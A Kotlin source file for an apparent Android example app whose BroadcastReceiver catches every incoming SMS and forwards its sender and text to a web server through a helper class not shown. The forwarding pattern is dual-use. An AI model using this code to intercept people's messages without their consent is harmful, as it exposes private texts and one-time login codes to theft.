package com.example.smsreader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage

class SMSReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            val bundle = intent.extras
            bundle?.let {
                val pdus = it["pdus"] as Array<*>?
                pdus?.forEach { pdu ->
                    val message = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = message.displayOriginatingAddress
                    val content = message.messageBody

                    // Send SMS content to web server
                    SMSService.sendSMSContentToServer(context, sender, content)
                }
            }
        }
    }
}